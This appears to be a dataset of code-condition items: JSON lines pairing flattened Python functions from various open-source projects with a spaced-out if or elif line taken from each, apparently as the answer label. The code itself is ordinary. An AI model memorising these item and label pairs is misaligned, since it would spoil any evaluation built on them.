{"input": "def _check_no_empty_dimension_lists(config): \"\"\"Verify that at least one dimension is not an empty list\"\"\" logging.info(\"Checking provided dimensions are valid\") for feature in config.get(\"test-suites\").values(): for test_name, test in feature.items(): for dimensions_config in test.values(): for dimensions_group in dimensions_config: if [] in dimensions_group.values(): logging.error( \"Values assigned to dimensions in test %s cannot be empty\", test_name, ) raise AssertionError", "label": "if [ ] in dimensions_group . values ( ) :"}
{"input": "def aggregate_sorted(self, items): create = self.createCombiner merge = self.mergeValue i = None for i, (k, v) in enumerate(items): if i == 0: curr_key = k curr_value = create(v) elif k != curr_key: yield curr_key, curr_value curr_key = k curr_value = create(v) else: curr_value = merge(curr_value, v) if i is not None: yield curr_key, curr_value", "label": "elif k != curr_key :"}
{"input": "def _run_iptables(self, version, cmd, *args): ipt_cmd = \"{} {}\".format(self._iptables_command(version), cmd) if self._has_w_argument is None: result = self.run_expect([0, 2], ipt_cmd, *args) if result.rc == 2: self._has_w_argument = False return self._run_iptables(version, cmd, *args) else: self._has_w_argument = True return result.stdout.rstrip(\"\\r\\n\") else: return self.check_output(ipt_cmd, *args)", "label": "if result . rc == 2 :"}
{"input": "def handle_data(self, data): if self.in_span or self.in_div: if data == \"No such user (please note that login is case sensitive)\": self.no_user = True elif data == \"Invalid password\": self.bad_pw = True elif data == \"User with that email already exists\": self.already_exists = True", "label": "elif data == \"User with that email already exists\" :"}
{"input": "def configure(self, **kw): \"\"\"Configure the image.\"\"\" res = () for k, v in _cnfmerge(kw).items(): if v is not None: if k[-1] == \"_\": k = k[:-1] if hasattr(v, \"__call__\"): v = self._register(v) elif k in (\"data\", \"maskdata\"): v = self.tk._createbytearray(v) res = res + (\"-\" + k, v) self.tk.call((self.name, \"config\") + res)", "label": "elif k in ( \"data\" , \"maskdata\" ) :"}
{"input": "def run(self): if self.distribution.install_requires: self.distribution.fetch_build_eggs(self.distribution.install_requires) if self.distribution.tests_require: self.distribution.fetch_build_eggs(self.distribution.tests_require) if self.test_suite: cmd = \" \".join(self.test_args) if self.dry_run: self.announce('skipping \"unittest %s\" (dry run)' % cmd) else: self.announce('running \"unittest %s\"' % cmd) self.with_project_on_sys_path(self.run_tests)", "label": "if self . dry_run :"}
{"input": "def wrapped(request, *args, **kwargs): if not gargoyle.is_active(key, request): if not redirect_to: raise Http404(\"Switch '%s' is not active\" % key) elif redirect_to.startswith(\"/\"): return HttpResponseRedirect(redirect_to) else: return HttpResponseRedirect(reverse(redirect_to)) return func(request, *args, **kwargs)", "label": "elif redirect_to . startswith ( \"/\" ) :"}
{"input": "def strip_suffixes(path: str) -> str: t = path while True: if t.endswith(\".xz\"): t = t[:-3] elif t.endswith(\".raw\"): t = t[:-4] elif t.endswith(\".tar\"): t = t[:-4] elif t.endswith(\".qcow2\"): t = t[:-6] else: break return t", "label": "if t . endswith ( \".xz\" ) :"}
{"input": "def tags(self): label = \"\" for dt in constants.DOMAIN_TYPES: if self.type == dt[0]: label = dt[1] result = [{\"name\": self.type, \"label\": label, \"type\": \"dom\"}] if self.transport: result.append( { \"name\": self.transport.service, \"label\": self.transport.service, \"type\": \"srv\", \"color\": \"info\", } ) return result", "label": "if self . type == dt [ 0 ] :"}
{"input": "def find_first_of_filetype(content, filterfiltype, attr=\"name\"): \"\"\"Find the first of the file type.\"\"\" filename = \"\" for _filename in content: if isinstance(_filename, str): if _filename.endswith(f\".{filterfiltype}\"): filename = _filename break else: if getattr(_filename, attr).endswith(f\".{filterfiltype}\"): filename = getattr(_filename, attr) break return filename", "label": "if getattr ( _filename , attr ) . endswith ( f\".{filterfiltype}\" ) :"}
{"input": "def check_data_array_types(self, *arrays): result = [] for array in arrays: if array is None or scipy.sparse.issparse(array): result.append(array) continue result.append(np.asanyarray(array)) if not result[-1].shape: raise RuntimeError( \"Given data-array is of unexpected type %s. Please pass numpy arrays instead.\" % type(array) ) return result", "label": "if array is None or scipy . sparse . issparse ( array ) :"}
{"input": "def description(self): global role_descriptions description = role_descriptions[self.role_field] content_type = self.content_type model_name = None if content_type: model = content_type.model_class() model_name = re.sub(r\"([a-z])([A-Z])\", r\"\\1 \\2\", model.__name__).lower() value = description if type(description) == dict: value = description.get(model_name) if value is None: value = description.get(\"default\") if \"%s\" in value and content_type: value = value % model_name return value", "label": "if value is None :"}
{"input": "def popupFrameXdiff(job, frame1, frame2, frame3=None): \"\"\"Opens a frame xdiff.\"\"\" for command in [\"/usr/bin/xxdiff\", \"/usr/local/bin/xdiff\"]: if os.path.isfile(command): for frame in [frame1, frame2, frame3]: if frame: command += \" --title1 %s %s\" % ( frame.data.name, getFrameLogFile(job, frame), ) shellOut(command)", "label": "if os . path . isfile ( command ) :"}
{"input": "def _groups_args_split(self, kwargs): groups_args_split = [] groups = kwargs[\"groups\"] for key, group in groups.iteritems(): mykwargs = kwargs.copy() del mykwargs[\"groups\"] if \"group_name\" in group: mykwargs[\"source_security_group_name\"] = group[\"group_name\"] if \"user_id\" in group: mykwargs[\"source_security_group_owner_id\"] = group[\"user_id\"] if \"group_id\" in group: mykwargs[\"source_security_group_id\"] = group[\"group_id\"] groups_args_split.append(mykwargs) return groups_args_split", "label": "if \"group_id\" in group :"}
{"input": "def _mangle_phone(phone, config): regexp = config.get(\"REGEXP\") if regexp: try: m = re.match(\"^/(.*)/(.*)/$\", regexp) if m: phone = re.sub(m.group(1), m.group(2), phone) except re.error: log.warning( u\"Can not mangle phone number. \" u\"Please check your REGEXP: {0!s}\".format(regexp) ) return phone", "label": "if m :"}
{"input": "def getScramRange(src): scramRange = None for mod in src.item.activeModulesIter(): if _isRegularScram(mod) or _isHicScram(mod): scramRange = max(scramRange or 0, mod.maxRange or 0) return scramRange", "label": "if _isRegularScram ( mod ) or _isHicScram ( mod ) :"}
{"input": "def snapshot(self): # if this volume is attached to a server # we need to freeze the XFS file system try: self.freeze() if self.server == None: snapshot = self.get_ec2_connection().create_snapshot(self.volume_id) else: snapshot = self.server.ec2.create_snapshot(self.volume_id) boto.log.info(\"Snapshot of Volume %s created: %s\" % (self.name, snapshot)) except Exception: boto.log.info(\"Snapshot error\") boto.log.info(traceback.format_exc()) finally: status = self.unfreeze() return status", "label": "if self . server == None :"}
{"input": "def closeststack(self, card): closest = None cdist = 999999999 # Since we only compare distances, # we don't bother to take the square root. for stack in self.openstacks: dist = (stack.x - card.x) ** 2 + (stack.y - card.y) ** 2 if dist < cdist: closest = stack cdist = dist return closest", "label": "if dist < cdist :"}
{"input": "def _sock_send(self, msg): try: if isinstance(msg, str): msg = msg.encode(\"ascii\") # http://docs.datadoghq.com/guides/dogstatsd/#datagram-format if self.dogstatsd_tags: msg = msg + b\"|#\" + self.dogstatsd_tags.encode(\"ascii\") if self.sock: self.sock.send(msg) except Exception: Logger.warning(self, \"Error sending message to statsd\", exc_info=True)", "label": "if self . sock :"}
{"input": "def styleRow(self, row, selected): if row > 0 and row < self.getRowCount(): if selected: self.getRowFormatter().addStyleName(row, \"user-SelectedRow\") else: self.getRowFormatter().removeStyleName(row, \"user-SelectedRow\")", "label": "if selected :"}
{"input": "def __gather_epoch_end_eval_results(self, outputs): eval_results = [] for epoch_output in outputs: result = epoch_output[0].__class__.gather(epoch_output) if \"checkpoint_on\" in result: result.checkpoint_on = result.checkpoint_on.mean() if \"early_stop_on\" in result: result.early_stop_on = result.early_stop_on.mean() eval_results.append(result) # with 1 dataloader don't pass in a list if len(eval_results) == 1: eval_results = eval_results[0] return eval_results", "label": "if \"early_stop_on\" in result :"}
{"input": "def network_state(self, device): cmd = [\"tc\", \"qdisc\", \"show\", \"dev\", device] try: output = self.host_exec.run(cmd) # sloppy but good enough for now if \" delay \" in output: return NetworkState.SLOW if \" loss \" in output: return NetworkState.FLAKY if \" duplicate \" in output: return NetworkState.DUPLICATE return NetworkState.NORMAL except Exception: return NetworkState.UNKNOWN", "label": "if \" duplicate \" in output :"}
{"input": "def canberra_grad(x, y): result = 0.0 grad = np.zeros(x.shape) for i in range(x.shape[0]): denominator = np.abs(x[i]) + np.abs(y[i]) if denominator > 0: result += np.abs(x[i] - y[i]) / denominator grad[i] = ( np.sign(x[i] - y[i]) / denominator - np.abs(x[i] - y[i]) * np.sign(x[i]) / denominator ** 2 ) return result, grad", "label": "if denominator > 0 :"}
{"input": "def readwrite(obj, flags): try: if flags & select.POLLIN: obj.handle_read_event() if flags & select.POLLOUT: obj.handle_write_event() if flags & select.POLLPRI: obj.handle_expt_event() if flags & (select.POLLHUP | select.POLLERR | select.POLLNVAL): obj.handle_close() except OSError as e: if e.args[0] not in _DISCONNECTED: obj.handle_error() else: obj.handle_close() except _reraised_exceptions: raise except: obj.handle_error()", "label": "if flags & select . POLLOUT :"}
{"input": "def get_func_name(obj): if inspect.ismethod(obj): match = RE_BOUND_METHOD.match(repr(obj)) if match: cls = match.group(\"class\") if not cls: return match.group(\"name\") return \"%s.%s\" % (match.group(\"class\"), match.group(\"name\")) return None", "label": "if match :"}
{"input": "def __init__(self, connection): self.username = connection.username self.password = connection.password self.domain = connection.domain self.hash = connection.hash self.lmhash = \"\" self.nthash = \"\" self.aesKey = connection.aesKey self.kdcHost = connection.kdcHost self.kerberos = connection.kerberos if self.hash is not None: if self.hash.find(\":\") != -1: self.lmhash, self.nthash = self.hash.split(\":\") else: self.nthash = self.hash if self.password is None: self.password = \"\"", "label": "if self . hash . find ( \":\" ) != - 1 :"}
{"input": "def indent_xml(elem, level=0): \"\"\"Do our pretty printing and make Matt very happy.\"\"\" i = \"\\n\" + level * \" \" if elem: if not elem.text or not elem.text.strip(): elem.text = i + \" \" if not elem.tail or not elem.tail.strip(): elem.tail = i for elem in elem: indent_xml(elem, level + 1) if not elem.tail or not elem.tail.strip(): elem.tail = i else: if level and (not elem.tail or not elem.tail.strip()): elem.tail = i", "label": "if level and ( not elem . tail or not elem . tail . strip ( ) ) :"}
{"input": "def add_braces_and_labels(self): for attr in \"horizontal_parts\", \"vertical_parts\": if not hasattr(self, attr): continue parts = getattr(self, attr) for subattr in \"braces\", \"labels\": if hasattr(parts, subattr): self.add(getattr(parts, subattr))", "label": "if not hasattr ( self , attr ) :"}
{"input": "def error_messages(file_list, files_removed): if files_removed is None: return for remove_this, reason in files_removed: if file_list is not None: file_list.remove(remove_this) if reason == 0: print(\" REMOVED : (\" + str(remove_this) + \") is not PNG file format\") elif reason == 1: print(\" REMOVED : (\" + str(remove_this) + \") already exists\") elif reason == 2: print(\" REMOVED : (\" + str(remove_this) + \") file unreadable\")", "label": "if reason == 0 :"}
{"input": "def keep_vocab_item(word, count, min_count, trim_rule=None): default_res = count >= min_count if trim_rule is None: return default_res else: rule_res = trim_rule(word, count, min_count) if rule_res == RULE_KEEP: return True elif rule_res == RULE_DISCARD: return False else: return default_res", "label": "elif rule_res == RULE_DISCARD :"}
{"input": "def func(x0): bind = 0 backups = [] vinputs = [] for i, i0 in zip(inputs, inputs0): if i is None: # Optional argument continue vinputs += [i] if i0 is not None: # Not need backward i.d[...] = x0[bind : bind + i.size].reshape(i.shape) bind += i.size backups.append(i.d.copy()) f.forward(vinputs, outputs) for ind, i in enumerate(inputs): if i is None: # Optional argument continue i.d[...] = backups[ind] return sum([np.sum(o.g * o.d) for o in outputs])", "label": "if i0 is not None :"}
{"input": "def _handle_js_events(self, change): if self.js_events: if self.event_handlers: for event in self.js_events: event_name = event[\"name\"] if event_name in self.event_handlers: self.event_handlers[event_name](event[\"detail\"]) # clears the event queue. self.js_events = []", "label": "if event_name in self . event_handlers :"}
{"input": "def validate(leaves): for leaf in leaves: if leaf.has_form((\"Rule\", \"RuleDelayed\"), 2): pass elif leaf.has_form(\"List\", None) or leaf.has_form(\"Association\", None): if validate(leaf.leaves) is not True: return False else: return False return True", "label": "if leaf . has_form ( ( \"Rule\" , \"RuleDelayed\" ) , 2 ) :"}
{"input": "def ascii85decode(data): n = b = 0 out = \"\" for c in data: if \"!\" <= c and c <= \"u\": n += 1 b = b * 85 + (ord(c) - 33) if n == 5: out += struct.pack(\">L\", b) n = b = 0 elif c == \"z\": assert n == 0 out += \"\\0\\0\\0\\0\" elif c == \"~\": if n: for _ in range(5 - n): b = b * 85 + 84 out += struct.pack(\">L\", b)[: n - 1] break return out", "label": "if n :"}
{"input": "def to_text(self, origin=None, relativize=True, **kw): next = self.next.choose_relativity(origin, relativize) text = \"\" for (window, bitmap) in self.windows: bits = [] for i in xrange(0, len(bitmap)): byte = bitmap[i] for j in xrange(0, 8): if byte & (0x80 >> j): bits.append(dns.rdatatype.to_text(window * 256 + i * 8 + j)) text += \" \" + \" \".join(bits) return \"%s%s\" % (next, text)", "label": "if byte & ( 0x80 >> j ) :"}
{"input": "def _on_response(self, widget, response): value = None if response == Gtk.ResponseType.OK: if self.value_type is int: value = self.spinbutton.get_value_as_int() else: value = self.spinbutton.get_value() self.deferred.callback(value) self.destroy()", "label": "if self . value_type is int :"}
{"input": "def send_preamble(self): \"\"\"Transmit version/status/date/server, via self._write()\"\"\" if self.origin_server: if self.client_is_modern(): self._write(\"HTTP/%s %s\\r\\n\" % (self.http_version, self.status)) if not self.headers.has_key(\"Date\"): self._write(\"Date: %s\\r\\n\" % time.asctime(time.gmtime(time.time()))) if self.server_software and not self.headers.has_key(\"Server\"): self._write(\"Server: %s\\r\\n\" % self.server_software) else: self._write(\"Status: %s\\r\\n\" % self.status)", "label": "if self . client_is_modern ( ) :"}
{"input": "def _save_postinsts_common(self, dst_postinst_dir, src_postinst_dir): num = 0 for p in self._get_delayed_postinsts(): bb.utils.mkdirhier(dst_postinst_dir) if os.path.exists(os.path.join(src_postinst_dir, p + \".postinst\")): shutil.copy( os.path.join(src_postinst_dir, p + \".postinst\"), os.path.join(dst_postinst_dir, \"%03d-%s\" % (num, p)), ) num += 1", "label": "if os . path . exists ( os . path . join ( src_postinst_dir , p + \".postinst\" ) ) :"}
{"input": "def edge_data_from_bmesh_edges(bm, edge_data): initial_index = bm.edges.layers.int.get(\"initial_index\") if initial_index is None: raise Exception(\"bmesh has no initial_index layer\") edge_data_out = [] n_edge_data = len(edge_data) for edge in bm.edges: idx = edge[initial_index] if idx < 0 or idx >= n_edge_data: debug(\"Unexisting edge_data[%s] [0 - %s]\", idx, n_edge_data) edge_data_out.append(None) else: edge_data_out.append(edge_data[idx]) return edge_data_out", "label": "if idx < 0 or idx >= n_edge_data :"}
{"input": "def write(self, data): try: c_written = DWORD() buffer = create_string_buffer(data) if not WriteFile(self.pStdin, buffer, len(buffer), byref(c_written), None): raise WinError() except: self.close()", "label": "if not WriteFile ( self . pStdin , buffer , len ( buffer ) , byref ( c_written ) , None ) :"}
{"input": "def get_icon(svg_path, size): pixbuf = GdkPixbuf.Pixbuf.new_from_file_at_scale(svg_path, size, size, True) data = bytearray(pixbuf.get_pixels()) channels = pixbuf.get_n_channels() assert channels == 4 # https://en.wikipedia.org/wiki/PackBits # no real compression going on here.. new_data = bytearray() for c in range(3): x = 0 for i in range(0, len(data), 4): if x == 0 or x % 128 == 0: new_data.append(127) new_data.append(data[i + c]) x += 1 return new_data", "label": "if x == 0 or x % 128 == 0 :"}
{"input": "def _get_instance_attribute( self, attr, default=None, defaults=None, incl_metadata=False ): if self.instance is None or not hasattr(self.instance, attr): if incl_metadata and attr in self.parsed_metadata: return self.parsed_metadata[attr] elif defaults is not None: for value in defaults: if callable(value): value = value() if value is not None: return value return default return getattr(self.instance, attr)", "label": "if value is not None :"}
{"input": "def forward(self, x): if self.ffn_type in (1, 2): x0 = self.wx0(x) if self.ffn_type == 1: x1 = x elif self.ffn_type == 2: x1 = self.wx1(x) out = self.output(x0 * x1) out = self.dropout(out) out = self.LayerNorm(out + x) return out", "label": "if self . ffn_type == 1 :"}
{"input": "def load(cls): if not cls._loaded: cls.log.debug(\"Loading tile_sets...\") if not horizons.globals.fife.use_atlases: cls._find_tile_sets(PATHS.TILE_SETS_DIRECTORY) else: cls.tile_sets = JsonDecoder.load(PATHS.TILE_SETS_JSON_FILE) cls.log.debug(\"Done!\") cls._loaded = True", "label": "if not horizons . globals . fife . use_atlases :"}
{"input": "def headerData(self, section, orientation, role=Qt.DisplayRole): if role == Qt.TextAlignmentRole: if orientation == Qt.Horizontal: return to_qvariant(int(Qt.AlignHCenter | Qt.AlignVCenter)) return to_qvariant(int(Qt.AlignRight | Qt.AlignVCenter)) if role != Qt.DisplayRole: return to_qvariant() if orientation == Qt.Horizontal: if section == NAME: return to_qvariant(\"Name\") elif section == VERSION: return to_qvariant(\"Version\") elif section == ACTION: return to_qvariant(\"Action\") elif section == DESCRIPTION: return to_qvariant(\"Description\") return to_qvariant()", "label": "elif section == VERSION :"}
{"input": "def find_enabled_item(self, e): x, y = e.local if ( 0 <= x < ( self.width - self.margin - self.scroll_button_size if self.scrolling else self.width ) ): h = self.font.get_linesize() i = (y - h // 2) // h + self.scroll items = self._items if 0 <= i < len(items): item = items[i] if item.enabled: return item", "label": "if item . enabled :"}
{"input": "def set_parallel_limit(environment): parallel_limit = environment.get(\"COMPOSE_PARALLEL_LIMIT\") if parallel_limit: try: parallel_limit = int(parallel_limit) except ValueError: raise errors.UserError( 'COMPOSE_PARALLEL_LIMIT must be an integer (found: \"{}\")'.format( environment.get(\"COMPOSE_PARALLEL_LIMIT\") ) ) if parallel_limit <= 1: raise errors.UserError(\"COMPOSE_PARALLEL_LIMIT can not be less than 2\") parallel.GlobalLimit.set_global_limit(parallel_limit)", "label": "if parallel_limit <= 1 :"}
{"input": "def migrate_identifier(self, raw_identifier: int): if self.unique_cog_identifier in self.data: # Data has already been migrated return poss_identifiers = [str(raw_identifier), str(hash(raw_identifier))] for ident in poss_identifiers: if ident in self.data: self.data[self.unique_cog_identifier] = self.data[ident] del self.data[ident] _save_json(self.data_path, self.data) break", "label": "if ident in self . data :"}
{"input": "def _memoize(*args, **kwargs): str_args = [] for arg in args: if not isinstance(arg, six.string_types): str_args.append(six.text_type(arg)) else: str_args.append(arg) args_ = \",\".join( list(str_args) + [\"{0}={1}\".format(k, kwargs[k]) for k in sorted(kwargs)] ) if args_ not in cache: cache[args_] = func(*args, **kwargs) return cache[args_]", "label": "if not isinstance ( arg , six . string_types ) :"}
{"input": "def extract(self): for battery in self.vars: for line in dopen(\"/proc/acpi/battery/\" + battery + \"/state\").readlines(): l = line.split() if len(l) < 3: continue if l[0:2] == [\"remaining\", \"capacity:\"]: remaining = int(l[2]) continue elif l[0:2] == [\"present\", \"rate:\"]: rate = int(l[2]) continue if rate and remaining: self.val[battery] = remaining * 60 / rate else: self.val[battery] = -1", "label": "if len ( l ) < 3 :"}
{"input": "def version_iter(q, limit=500, offset=0): q[\"limit\"] = limit q[\"offset\"] = offset while True: url = base_url() + \"/version\" v = jsonload(url) if not v: return for i in query(q): yield i q[\"offset\"] += limit", "label": "if not v :"}
{"input": "def _letf_btn_press(self, event): try: elem = self.identify(event.x, event.y) index = self.index(\"@%d,%d\" % (event.x, event.y)) if \"closebutton\" in elem: self.state([\"pressed\"]) self.pressed_index = index except Exception: # may fail, if clicked outside of tab return", "label": "if \"closebutton\" in elem :"}
{"input": "def get_location(self, dist, dependency_links): for url in dependency_links: egg_fragment = Link(url).egg_fragment if not egg_fragment: continue if \"-\" in egg_fragment: ## FIXME: will this work when a package has - in the name? key = \"-\".join(egg_fragment.split(\"-\")[:-1]).lower() else: key = egg_fragment if key == dist.key: return url.split(\"#\", 1)[0] return None", "label": "if \"-\" in egg_fragment :"}
{"input": "def viewTreeItemClicked(self, event): if DEBUG: print(\"viewTreeitemClicked:\", event.__dict__, file=sys.stderr) self.unmarkTargets() vuid = self.viewTree.viewTree.identify_row(event.y) if vuid: view = self.vc.viewsById[vuid] if view: coords = view.getCoords() if view.isTarget(): self.markTarget(coords[0][0], coords[0][1], coords[1][0], coords[1][1]) self.viewDetails.set(view)", "label": "if view :"}
{"input": "def getVar(self, name): value = self.tinfoil.run_command(\"dataStoreConnectorFindVar\", self.dsindex, name) overrides = None if isinstance(value, dict): if \"_connector_origtype\" in value: value[\"_content\"] = self.tinfoil._reconvert_type( value[\"_content\"], value[\"_connector_origtype\"] ) del value[\"_connector_origtype\"] if \"_connector_overrides\" in value: overrides = value[\"_connector_overrides\"] del value[\"_connector_overrides\"] return value, overrides", "label": "if \"_connector_overrides\" in value :"}
{"input": "def sample(self, **config): \"\"\"Sample a configuration from this search space.\"\"\" ret = [] kwspaces = self.kwspaces striped_keys = [k.split(SPLITTER)[0] for k in config.keys()] for idx, obj in enumerate(self.data): if isinstance(obj, NestedSpace): sub_config = _strip_config_space(config, prefix=str(idx)) ret.append(obj.sample(**sub_config)) elif isinstance(obj, SimpleSpace): ret.append(config[str(idx)]) else: ret.append(obj) return ret", "label": "elif isinstance ( obj , SimpleSpace ) :"}
{"input": "def main(): for filename in sys.argv[1:]: if os.path.isdir(filename): print(filename, \"Directory!\") continue with open(filename, \"rb\") as f: data = f.read() if b\"\\0\" in data: print(filename, \"Binary!\") continue newdata = data.replace(b\"\\r\\n\", b\"\\n\") if newdata != data: print(filename) with open(filename, \"wb\") as f: f.write(newdata)", "label": "if os . path . isdir ( filename ) :"}
{"input": "def normalize_crlf(tree): for elem in tree.getiterator(): if elem.text: elem.text = elem.text.replace(\"\\r\\n\", \"\\n\") if elem.tail: elem.tail = elem.tail.replace(\"\\r\\n\", \"\\n\")", "label": "if elem . tail :"}
{"input": "def RegisterValue(self, value): \"\"\"Puts a given value into an appropriate bin.\"\"\" if self.bins: for b in self.bins: if b.range_max_value > value: b.num += 1 return self.bins[-1].num += 1", "label": "if b . range_max_value > value :"}
{"input": "def all_commands(): all_cmds = [] for bp in BINPATHS: cmds = [ fn[:-3] for fn in os.listdir(bp) if fn.endswith(\".py\") and not fn.startswith(\".\") and os.path.isfile(os.path.join(bp, fn)) ] all_cmds += cmds all_cmds.sort() return all_cmds", "label": "if fn . endswith ( \".py\" )"}
{"input": "def base64_encode_image_mapper(self, tag, url): if tag == \"img\": if url in self.kp_images: image_data = base64.b64encode(self.kp_images[url]) image_mimetype = mimetypes.guess_type(url)[0] if image_mimetype is not None: return \"data:{};base64, \".format(image_mimetype) + image_data.decode( \"utf-8\" ) return None", "label": "if image_mimetype is not None :"}
{"input": "def validate_input(self): if self.validation_fn: success, err = self.validation_fn(self.str) if not success: spaces = \" \" * self.textwin_width self.textwin.addstr(self.y + 2, 0, spaces) self.textwin.addstr(self.y + 2, 0, err, curses.color_pair(4)) return success else: return True", "label": "if not success :"}
{"input": "def start_prompt(self): \"\"\"Start the interpreter.\"\"\" logger.show(\"Coconut Interpreter:\") logger.show(\"(type 'exit()' or press Ctrl-D to end)\") self.start_running() while self.running: try: code = self.get_input() if code: compiled = self.handle_input(code) if compiled: self.execute(compiled, use_eval=None) except KeyboardInterrupt: printerr(\"\\nKeyboardInterrupt\")", "label": "if compiled :"}
{"input": "def __exit__(self, exc_type, exc_val, exc_tb): if self.channel and self.channel.connection: conn_errors = self.channel.connection.client.connection_errors if not isinstance(exc_val, conn_errors): try: self.cancel() except Exception: pass", "label": "if not isinstance ( exc_val , conn_errors ) :"}
{"input": "def pack(data, size, endian): buf = [] for i in data: num = int(i) if num < 0: num += 1 << (size * 8) d = [b\"\\x00\"] * size i = size - 1 while i >= 0: b = num & 255 d[i] = bytes((b,)) if PY3 else chr(b) num >>= 8 i -= 1 if endian == \"<\": d = b\"\".join(d[i : i + 1][0] for i in reversed(xrange(len(d)))) else: d = b\"\".join(d) buf.append(d) return b\"\".join(buf)", "label": "if num < 0 :"}
{"input": "def _sample_new_noise_and_add(self, *, tf_sess=None, override=False): if self.framework == \"tf\": if override and self.weights_are_currently_noisy: tf_sess.run(self.tf_remove_noise_op) tf_sess.run(self.tf_sample_new_noise_and_add_op) else: if override and self.weights_are_currently_noisy: self._remove_noise() self._sample_new_noise() self._add_stored_noise() self.weights_are_currently_noisy = True", "label": "if override and self . weights_are_currently_noisy :"}
{"input": "def hdfs_link_js(url): link = \"javascript:void(0)\" if url: path = Hdfs.urlsplit(url)[2] if path: link = ( \"/filebrowser/view=%s\" if path.startswith(posixpath.sep) else \"/filebrowser/home_relative_view=/%s\" ) % path return link", "label": "if path . startswith ( posixpath . sep )"}
{"input": "def set_xticklabels(self, labels=None, step=None, **kwargs): \"\"\"Set x axis tick labels on the bottom row of the grid.\"\"\" for ax in self.axes[-1, :]: if labels is None: labels = [l.get_text() for l in ax.get_xticklabels()] if step is not None: xticks = ax.get_xticks()[::step] labels = labels[::step] ax.set_xticks(xticks) ax.set_xticklabels(labels, **kwargs) return self", "label": "if step is not None :"}
{"input": "def _get_statement_from_file(user, fs, snippet): script_path = snippet[\"statementPath\"] if script_path: script_path = script_path.replace(\"hdfs://\", \"\") if fs.do_as_user(user, fs.isfile, script_path): return fs.do_as_user(user, fs.read, script_path, 0, 16 * 1024 ** 2)", "label": "if fs . do_as_user ( user , fs . isfile , script_path ) :"}
{"input": "def doWorkUnit(self): if len(self.workers): try: w = self.workers.popleft() w.next() self.workers.append(w) except StopIteration: if hasattr(w, \"needsRedraw\") and w.needsRedraw: self.invalidate() else: time.sleep(0.001)", "label": "if hasattr ( w , \"needsRedraw\" ) and w . needsRedraw :"}
{"input": "def _find_l1_phash_mul(cdict): candidate_lengths = _find_candidate_lengths_mul(cdict.tuple2int) for p in candidate_lengths: hash_f = hashmul.hashmul_t(p) if hash_f.is_perfect(iter(cdict.tuple2int.values())): return l1_phash_t(cdict, hash_f) del hash_f return None", "label": "if hash_f . is_perfect ( iter ( cdict . tuple2int . values ( ) ) ) :"}
{"input": "def _find_next_tab_stop(self, direction): old_focus = self._focus self._focus += direction while self._focus != old_focus: if self._focus < 0: self._focus = len(self._layouts) - 1 if self._focus >= len(self._layouts): self._focus = 0 try: if direction > 0: self._layouts[self._focus].focus(force_first=True) else: self._layouts[self._focus].focus(force_last=True) break except IndexError: self._focus += direction", "label": "if direction > 0 :"}
{"input": "def _get_py_flags(self): res = dict(self.flags) cflags = res.pop(\"cflags\", \"\") for fl in cflags.split(\"|\"): fl = fl.strip() if fl == \"GA_USE_DOUBLE\": res[\"have_double\"] = True if fl == \"GA_USE_SMALL\": res[\"have_small\"] = True if fl == \"GA_USE_COMPLEX\": res[\"have_complex\"] = True if fl == \"GA_USE_HALF\": res[\"have_half\"] = True return res", "label": "if fl == \"GA_USE_SMALL\" :"}
{"input": "def _install_provision_configs(self): config = self._config.plugins[self.full_name] files = config.get(\"provision_config_files\", []) if files: if not install_provision_configs(files, self._mountpoint): log.critical(\"Error installing provisioning configs\") return False else: log.debug(\"Provision config files successfully installed\") return True else: log.debug(\"No provision config files configured\") return True", "label": "if not install_provision_configs ( files , self . _mountpoint ) :"}
{"input": "def postfile(self): for clientip, serverips in self.client_conns.items(): target_count = len(serverips) S = min((len(self.server_conns[serverip]) for serverip in serverips)) if S > 2 or target_count < 5: continue # TODO implement whitelist self.write( \"Scanning IP: {} / S score: {:.1f} / Number of records: {}\".format( clientip, S, target_count ) )", "label": "if S > 2 or target_count < 5 :"}
{"input": "def update_defaults(self, *values, **kwargs): for value in values: if type(value) == dict: self.DEFAULT_CONFIGURATION.update(value) elif isinstance(value, types.ModuleType): self.__defaults_from_module(value) elif isinstance(value, str): if os.path.exists(value): self.__defaults_from_file(value) else: logger.warning(\"Configuration file {} does not exist.\".format(value)) elif isinstance(value, type(None)): pass else: raise ValueError(\"Cannot interpret {}\".format(value)) self.DEFAULT_CONFIGURATION.update(kwargs)", "label": "if type ( value ) == dict :"}
{"input": "def __init__(self, aList): for element in aList: if len(element) > 0: if element.tag == element[0].tag: self.append(ListParser(element)) else: self.append(DictParser(element)) elif element.text: text = element.text.strip() if text: self.append(text)", "label": "if len ( element ) > 0 :"}
{"input": "def _get_py_flags(self): res = dict(self.flags) cflags = res.pop(\"cflags\", \"\") for fl in cflags.split(\"|\"): fl = fl.strip() if fl == \"GA_USE_DOUBLE\": res[\"have_double\"] = True if fl == \"GA_USE_SMALL\": res[\"have_small\"] = True if fl == \"GA_USE_COMPLEX\": res[\"have_complex\"] = True if fl == \"GA_USE_HALF\": res[\"have_half\"] = True return res", "label": "if fl == \"GA_USE_DOUBLE\" :"}
{"input": "def consume_bytes(data): state_machine.receive_data(data) while True: event = state_machine.next_event() if event is h11.NEED_DATA: break elif isinstance(event, h11.InformationalResponse): # Ignore 1xx responses continue elif isinstance(event, h11.Response): # We have our response! Save it and get out of here. context[\"h11_response\"] = event raise LoopAbort else: # Can't happen raise RuntimeError(\"Unexpected h11 event {}\".format(event))", "label": "if event is h11 . NEED_DATA :"}
{"input": "def status_string(self): if not self.live: if self.expired: return _(\"expired\") elif self.approved_schedule: return _(\"scheduled\") elif self.workflow_in_progress: return _(\"in moderation\") else: return _(\"draft\") else: if self.approved_schedule: return _(\"live + scheduled\") elif self.workflow_in_progress: return _(\"live + in moderation\") elif self.has_unpublished_changes: return _(\"live + draft\") else: return _(\"live\")", "label": "elif self . has_unpublished_changes :"}
{"input": "def _update_input_entries(entries): for entry in entries: comma = entry.get(\"comma_separated\", False) if comma: entry[\"regex\"] = r\"([^{}\\[\\]]*)\\{\" + entry[\"regex\"] else: entry[\"regex\"] = r\"([^,{}\\[\\]]*)\\{\" + entry[\"regex\"] entry[\"type\"] = \"input\"", "label": "if comma :"}
{"input": "def get_release(): regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\") here = os.path.dirname(__file__) root = os.path.dirname(here) init_py = os.path.join(root, \"aiomysql\", \"__init__.py\") with open(init_py) as f: for line in f: match = regexp.match(line) if match is not None: return match.group(1) else: raise RuntimeError(\"Cannot find version in aiomysql/__init__.py\")", "label": "if match is not None :"}
